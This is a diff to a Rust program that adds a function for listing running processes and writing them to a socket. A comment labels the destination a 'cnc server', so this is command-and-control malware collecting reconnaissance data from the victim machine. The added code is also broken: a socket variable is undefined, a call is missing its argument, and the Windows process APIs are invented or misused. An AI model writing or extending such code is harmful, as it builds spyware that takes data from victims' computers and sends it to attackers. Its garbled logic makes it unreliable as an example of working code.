@@ -152,9 +152,10 @@ fn system_info() {
     // Print the system total inodes.
     println!("{}", SYSTEM_TOTAL_INODES);
 
-    // call send_system_info_data() and pass the current socket.
+    // Get data to send off to cnc server.
     send_system_info_data();
-    
+    get_running_processes();
+
 }
 
 // The function should accept the following arguments:
@@ -292,5 +293,95 @@ fn send_system_info_data(socket: &TcpStream) {
             println!("Error: {}", e);
         }
     };
+}
 
+// Write a function that retrieves all running processes on the computer.
+fn get_running_processes() -> Vec<String> {
+    // Create a vector to hold the results.
+    let mut results: Vec<String> = Vec::new();
+
+    // Open the process list.
+    let mut process_list = match OpenProcess(PROCESS_ALL_ACCESS, false, 0) {
+        Some(process_list) => process_list,
+        None => {
+            println!("Failed to get the process list.");
+            return results;
+        }
+    };
+
+    // Get the process list size.
+    let mut process_list_size = 0;
+    match GetProcessList(process_list, &mut process_list_size) {
+        Some(_) => {
+            println!("Process list size: {}", process_list_size);
+        }
+        None => {
+            println!("Failed to get the process list size.");
+            return results;
+        }
+    };
+
+    // Create a vector to hold the process IDs.
+    let mut process_ids: Vec<u32> = Vec::new();
+    process_ids.resize(process_list_size as usize, 0);
+
+    // Get the process IDs.
+    match GetProcessList(process_list, &mut process_list_size) {
+        Some(process_ids) => {
+            println!("Process IDs: {:?}", process_ids);
+        }
+        None => {
+            println!("Failed to get the process IDs.");
+            return results;
+        }
+    };
+
+    // Create a vector to hold the process names.
+    let mut process_names: Vec<String> = Vec::new();
+    process_names.resize(process_list_size as usize, String::new());
+
+    // Get the process names.
+    match GetProcessNameList(process_list, &mut process_list_size, &mut process_names) {
+        Some(process_names) => {
+            println!("Process names: {:?}", process_names);
+        }
+        None => {
+            println!("Failed to get the process names.");
+            return results;
+        }
+    };
+
+    // Write all running processes to the socket.
+    for i in 0..process_list_size {
+        // Create a vector to hold the data.
+        let mut data = Vec::new();
+
+        // Write the process ID.
+        data.extend_from_slice(format!("{}", process_ids[i]).as_bytes());
+        // Write the process name.
+        data.extend_from_slice(process_names[i].as_bytes());
+
+        // Write the data to the socket.
+        match socket.write(&data) {
+            Ok(_) => {
+                println!("Data sent.");
+            }
+            Err(e) => {
+                println!("Error: {}", e);
+            }
+        };
+    }
+
+    // Close the socket.
+    match socket.shutdown(Shutdown::Both) {
+        Ok(_) => {
+            println!("Socket closed.");
+        }
+        Err(e) => {
+            println!("Error: {}", e);
+        }
+    };
+
+    // Return the results.
+    results
 }
